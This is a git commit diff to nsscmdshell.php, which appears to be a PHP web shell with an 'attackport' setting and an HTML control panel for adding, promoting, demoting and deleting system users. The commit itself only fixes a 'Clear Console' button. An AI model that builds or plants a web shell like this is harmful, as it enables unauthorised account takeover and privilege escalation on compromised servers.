ad7a99f054716ab4757317c12a8682c82e81dceb
Johnny Watts <58899228+kaotickj@users.noreply.github.com>
2022-04-11 17:09:47 -0400

    corrects clear console button error

--- nsscmdshell.php
+++ nsscmdshell.php
@@ -73,8 +73,8 @@ $attackport = "8000";
         <form action="" method="get">
         <input type="text" name="user" placeholder="user to alter" />&nbsp;&nbsp;<input type="text" name="pass" placeholder="password if adding user" />
         <br><br>
-        <button type="submit" name="addUser" title="adds the specified user to the system with the password provided.">Add User</button>&nbsp;<button type="submit" name="userAdmin" title="sets the specified user as adminstrator. only works with sufficient permissions on the current user.">Set Admin</button>&nbsp;<button type="submit" name="userStandard" title="sets the specified user as a standard user. only works with sufficient permissions on the current user.">Set Standard User</button>&nbsp;<button type="submit" name="delUser" title="deletes the specified user from the system. only works with sufficient permissions on the current user.">DelUser</button>&nbsp;&nbsp;&nbsp;&nbsp;<button onClick="window.location.reload();">Clear Console</button>
-        </form><br>';
+        <button type="submit" name="addUser" title="adds the specified user to the system with the password provided.">Add User</button>&nbsp;<button type="submit" name="userAdmin" title="sets the specified user as adminstrator. only works with sufficient permissions on the current user.">Set Admin</button>&nbsp;<button type="submit" name="userStandard" title="sets the specified user as a standard user. only works with sufficient permissions on the current user.">Set Standard User</button>&nbsp;<button type="submit" name="delUser" title="deletes the specified user from the system. only works with sufficient permissions on the current user.">DelUser</button>&nbsp;&nbsp;&nbsp;&nbsp;
+        </form><br><form><input type="hidden" name="clear" value="true" /><button onClick="window.location.reload();">Clear Console</button></form><br>';
 
         echo '<a href="?update=true"><small><small><small>Update</small></small></small></a><br><br>
         </div>';
